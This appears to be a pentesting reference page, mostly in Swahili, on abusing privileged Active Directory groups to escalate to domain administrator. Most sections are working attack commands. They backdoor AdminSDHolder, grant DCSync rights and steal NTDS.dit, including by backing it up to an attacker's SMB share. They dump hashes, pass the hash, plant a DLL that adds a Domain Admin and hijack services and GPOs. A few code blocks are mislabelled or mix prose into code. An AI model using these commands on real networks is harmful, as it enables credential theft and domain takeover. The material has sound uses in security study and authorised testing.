# Privileged Groups

{{#include ../../banners/hacktricks-training.md}}

## Vikundi vinavyojulikana vyenye privileges za administration

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Kikundi hiki kina mamlaka ya kuunda accounts na vikundi ambavyo si administrators kwenye domain. Pia, kinawezesha login ya ndani kwenye Domain Controller (DC).

Ili kutambua wanachama wa kikundi hiki, command ifuatayo hutekelezwa:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Kuongeza users wapya kunaruhusiwa, pamoja na local login kwenye DC.<sup>[[1]](#references)</sup>

## AdminSDHolder group

**AdminSDHolder** group's Access Control List (ACL) ni muhimu kwa sababu huweka permissions kwa "protected groups" zote ndani ya Active Directory, ikiwemo groups zenye privileges za juu. Utaratibu huu huhakikisha usalama wa groups hizi kwa kuzuia marekebisho yasiyoidhinishwa.

Attacker anaweza kutumia udhaifu huu kwa kurekebisha ACL ya **AdminSDHolder** group na kumpa standard user permissions kamili. Hii ingempa user huyo control kamili juu ya protected groups zote. Ikiwa permissions za user huyo zitabadilishwa au kuondolewa, zitarudishwa automatically ndani ya saa moja kutokana na muundo wa system.<sup>[[14]](#references)</sup>

Nyaraka za hivi karibuni za Windows Server bado zinachukulia operator groups kadhaa zilizojengwa ndani kuwa objects **protected** (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, n.k.). Mchakato wa **SDProp** huendeshwa kwenye **PDC Emulator** kila baada ya dakika 60 kwa default, huweka `adminCount=1`, na huzima inheritance kwenye protected objects. Hii ni muhimu kwa persistence na pia kwa kutafuta privileged users waliopitwa na wakati ambao waliondolewa kwenye protected group lakini bado wanaendelea kuwa na ACL isiyorithi.<sup>[[12]](#references)</sup>

Commands za kukagua members na kurekebisha permissions ni pamoja na:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
Script inapatikana ili kuharakisha mchakato wa kurejesha: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Kwa maelezo zaidi, tembelea [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).<sup>[[14]](#references)</sup>

## AD Recycle Bin

Uanachama katika group hili huruhusu kusoma objekti zilizofutwa za Active Directory, jambo ambalo linaweza kufichua taarifa nyeti:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Hii ni muhimu kwa **kurejesha njia za awali za privilege**. Objects zilizofutwa bado zinaweza kufichua `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, SPNs za zamani, au DN ya privileged group iliyofutwa ambayo baadaye inaweza kurejeshwa na operator mwingine.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Ufikiaji wa Domain Controller

Ufikiaji wa faili kwenye DC umezuiwa isipokuwa mtumiaji awe sehemu ya kikundi cha `Server Operators`, hali inayobadilisha kiwango cha ufikiaji.

### Privilege Escalation

Kwa kutumia `PsService` au `sc` kutoka Sysinternals, mtu anaweza kukagua na kurekebisha ruhusa za services. Kikundi cha `Server Operators`, kwa mfano, kina udhibiti kamili wa services fulani, hivyo kuruhusu utekelezaji wa arbitrary commands na privilege escalation:<sup>[[1]](#references)</sup>
```cmd
C:\> .\PsService.exe security AppReadiness
```
Amri hii inafichua kwamba `Server Operators` wana ufikiaji kamili, na hivyo kuwezesha udanganyifu wa services kwa ajili ya kupata privileges za juu.

## Backup Operators

Uanachama katika kundi la `Backup Operators` hutoa ufikiaji wa mfumo wa faili wa `DC01` kutokana na privileges za `SeBackup` na `SeRestore`. Privileges hizi huwezesha kupita kwenye folda, kuorodhesha, na kunakili faili, hata bila permissions zilizoainishwa wazi, kwa kutumia flag ya `FILE_FLAG_BACKUP_SEMANTICS`. Kutumia scripts maalum ni muhimu kwa mchakato huu.<sup>[[1]](#references)</sup>

Ili kuorodhesha washiriki wa kundi, tekeleza:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Mashambulizi ya Ndani

Ili kutumia privileges hizi ndani ya mfumo, hatua zifuatazo hutumika:

1. Import libraries zinazohitajika:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Wezesha na uthibitishe `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Fikia na unakili faili kutoka saraka zilizowekewa vikwazo, kwa mfano:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

Ufikiaji wa moja kwa moja wa file system ya Domain Controller huruhusu kuiba database ya `NTDS.dit`, ambayo ina NTLM hashes zote za watumiaji na kompyuta za domain.

#### Kutumia diskshadow.exe

1. Unda shadow copy ya drive ya `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Nakili `NTDS.dit` kutoka kwenye shadow copy:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Vinginevyo, tumia `robocopy` kwa kunakili faili:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Toa `SYSTEM` na `SAM` kwa ajili ya kupata hash:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Pata hashes zote kutoka `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Baada ya extraction: Pass-the-Hash hadi DA<sup>[[11]](#references)</sup>
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Using wbadmin.exe

1. Sanidi mfumo wa faili wa NTFS kwa seva ya SMB kwenye mashine ya mshambuliaji na uhifadhi credentials za SMB kwenye mashine lengwa.
2. Tumia `wbadmin.exe` kwa system backup na extraction ya `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Kwa demonstration ya vitendo, tazama [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Wanachama wa group ya **DnsAdmins** wanaweza kutumia privileges zao kupakia DLL arbitrary yenye SYSTEM privileges kwenye DNS server, ambayo mara nyingi hu-host kwenye Domain Controllers. Uwezo huu unaruhusu exploitation kubwa.

Ili kuorodhesha wanachama wa group ya DnsAdmins, tumia:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Tekeleza DLL holela (CVE‑2021‑40469)

> [!NOTE]
> Athari hii huruhusu utekelezaji wa code holela kwa SYSTEM privileges katika DNS service (kwa kawaida ndani ya DCs). Tatizo hili lilirekebishwa mwaka wa 2021.

Members wanaweza kufanya DNS server ipakie DLL holela (iwe ndani ya mfumo au kutoka remote share) kwa kutumia commands kama vile:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Kuanzisha upya huduma ya DNS (ambako kunaweza kuhitajika ruhusa za ziada) ni muhimu ili DLL ipakizwe:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Kwa maelezo zaidi kuhusu attack vector hii, rejelea ired.team.

#### Mimilib.dll

Pia inawezekana kutumia mimilib.dll kwa command execution, kwa kuirekebisha ili itekeleze commands maalum au reverse shells. [Angalia chapisho hili](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) kwa maelezo zaidi.<sup>[[15]](#references)</sup>

### WPAD Record for MitM

DnsAdmins wanaweza kudhibiti DNS records ili kutekeleza mashambulizi ya Man-in-the-Middle (MitM), kwa kuunda WPAD record baada ya kuzima global query block list. Tools kama Responder au Inveigh zinaweza kutumika kwa spoofing na kunasa network traffic.

### Event Log Readers
Members wanaweza kufikia event logs, na huenda wakapata taarifa nyeti kama vile plaintext passwords au maelezo ya command execution:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Kundi hili linaweza kurekebisha DACLs kwenye domain object, na hivyo uwezekano wa kutoa privileges za DCSync. Techniques za privilege escalation zinazotumia kundi hili zimeelezwa kwa kina katika GitHub repo ya Exchange-AD-Privesc.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Ikiwa unaweza kutenda kama mwanachama wa kikundi hiki, matumizi mabaya ya kawaida ni kumpa principal anayodhibitiwa na mshambulizi haki za replication zinazohitajika kwa [DCSync](dcsync.md):
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Kihistoria, **PrivExchange** iliunganisha mailbox access, coerced Exchange authentication, na LDAP relay ili kufikia primitive hii hii. Hata pale ambapo relay path hiyo imezuiwa, membership ya moja kwa moja katika `Exchange Windows Permissions` au udhibiti wa Exchange server bado ni njia yenye thamani kubwa ya kupata domain replication rights.

## Hyper-V Administrators

Hyper-V Administrators wana access kamili kwa Hyper-V, ambayo inaweza kutumiwa kupata udhibiti wa virtualized Domain Controllers. Hii inajumuisha cloning ya DCs zinazofanya kazi na kutoa NTLM hashes kutoka kwenye faili la NTDS.dit.

### Mfano wa Exploitation

Abuse ya kiutendaji kwa kawaida ni **offline access ya DC disks/checkpoints** badala ya tricks za zamani za host-level LPE. Kwa access ya Hyper-V host, operator anaweza kuunda checkpoint au ku-export virtualized Domain Controller, ku-mount VHDX, na kutoa `NTDS.dit`, `SYSTEM`, pamoja na secrets nyingine bila kugusa LSASS ndani ya guest:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
Kuanzia hapo, tumia tena workflow ya `Backup Operators` kunakili `Windows\NTDS\ntds.dit` na registry hives ukiwa offline.

## Group Policy Creators Owners

Kundi hili huruhusu members kuunda Group Policies kwenye domain. Hata hivyo, members wake hawawezi kutumia group policies kwa users au groups, wala kuhariri GPOs zilizopo.

Nuance muhimu ni kwamba **creator huwa owner wa GPO mpya** na kwa kawaida hupata rights za kutosha za kuihariri baadaye. Hii inamaanisha kuwa kundi hili huwa muhimu unapoweza:

- kuunda GPO hasidi na kumshawishi admin kuiunganisha na OU/domain inayolengwa
- kuhariri GPO uliyounda ambayo tayari imeunganishwa mahali penye manufaa
- kutumia vibaya delegated right nyingine inayokuruhusu kuunganisha GPOs, huku kundi hili likikupa upande wa kuhariri

Abuse ya kawaida kwa vitendo humaanisha kuongeza **Immediate Task**, **startup script**, **local admin membership**, au mabadiliko ya **user rights assignment** kupitia policy files zinazohifadhiwa kwenye SYSVOL.<sup>[[3]](#references)[[4]](#references)[[13]](#references)</sup>
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
Ikiwa unahariri GPO mwenyewe kupitia `SYSVOL`, kumbuka kuwa mabadiliko hayo hayatoshi peke yake: `versionNumber`, `GPT.ini`, na wakati mwingine `gPCMachineExtensionNames` lazima pia visasishwe, la sivyo clients watapuuza policy refresh.<sup>[[9]](#references)</sup>

## Organization Management

Katika mazingira ambayo **Microsoft Exchange** imedeployiwa, kuna group maalum linalojulikana kama **Organization Management** lenye capabilities muhimu. Group hili lina privileges za **ku-access mailboxes za domain users wote** na linaendelea kuwa na **full control juu ya 'Microsoft Exchange Security Groups'** Organizational Unit (OU). Control hii inajumuisha group la **`Exchange Windows Permissions`**, ambalo linaweza kutumiwa kwa privilege escalation.

### Privilege Exploitation and Commands

#### Print Operators

Members wa group la **Print Operators** wamepewa privileges kadhaa, zikiwemo **`SeLoadDriverPrivilege`**, inayowawezesha **ku-log on locally kwenye Domain Controller**, kuizima, na kusimamia printers. Ili ku-exploit privileges hizi, hasa ikiwa **`SeLoadDriverPrivilege`** haionekani katika unelevated context, ni lazima kubypass User Account Control (UAC).<sup>[[1]](#references)</sup>

Ili kuorodhesha members wa group hili, PowerShell command ifuatayo hutumiwa:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Kwenye Domain Controllers, group hii ni hatari kwa sababu default Domain Controller Policy inawapa **`SeLoadDriverPrivilege`** wanachama wa `Print Operators`. Ukipata token iliyoinuliwa ya mwanachama wa group hii, unaweza kuwezesha privilege hiyo na kupakia driver iliyosainiwa lakini iliyo katika hatari, kisha kupata kernel/SYSTEM.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)</sup> Kwa maelezo kuhusu ushughulikiaji wa token, angalia [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Wanachama wa group hii hupewa ufikiaji wa PC kupitia Remote Desktop Protocol (RDP). Ili kuorodhesha wanachama hawa, kuna PowerShell commands:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Maelezo zaidi kuhusu kutumia RDP yanaweza kupatikana katika rasilimali maalum za pentesting.

#### Watumiaji wa Usimamizi wa Mbali

Members wanaweza kufikia PCs kupitia **Windows Remote Management (WinRM)**. Enumeration ya members hawa hupatikana kupitia:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Kwa mbinu za exploitation zinazohusiana na **WinRM**, nyaraka maalum zinapaswa kusomwa.

#### Server Operators

Kikundi hiki kina ruhusa za kufanya usanidi mbalimbali kwenye Domain Controllers, ikiwemo privileges za kuhifadhi nakala na kurejesha, kubadilisha muda wa mfumo, na kuzima mfumo.<sup>[[1]](#references)</sup> Ili kuorodhesha wanachama, command iliyotolewa ni:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
Kwenye Domain Controllers, `Server Operators` kwa kawaida hurithi haki za kutosha za **kusanidi upya au kuwasha/kuzima services** na pia hupokea `SeBackupPrivilege`/`SeRestorePrivilege` kupitia default DC policy. Kwa vitendo, hii huwafanya kuwa kiungo kati ya **service-control abuse** na **NTDS extraction**:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Ikiwa service ACL inaupa group hii ruhusa za kubadilisha/kuanzisha, elekeza service kwenye command yoyote, ianzishe kama `LocalSystem`, kisha urejeshe `binPath` ya awali. Ikiwa udhibiti wa service umefungwa, tumia mbinu za `Backup Operators` zilizo hapo juu kunakili `NTDS.dit`.

## References

- [1] [ired.team – Privileged Accounts and Token Privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Abusing SeLoadDriverPrivilege for Privilege Escalation](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – Abusing GPO Permissions](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – GPO Abuse - Part 1](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – A Red Teamer's Guide to GPOs and OUs](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Undocumented NT Internals – NtLoadDriver Function](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [11] [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Appendix C: Protected Accounts and Groups in Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – How to Abuse and Backdoor AdminSDHolder to Obtain Domain Admin Persistence](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Abusing DnsAdmins Privilege for Escalation in Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)

{{#include ../../banners/hacktricks-training.md}}
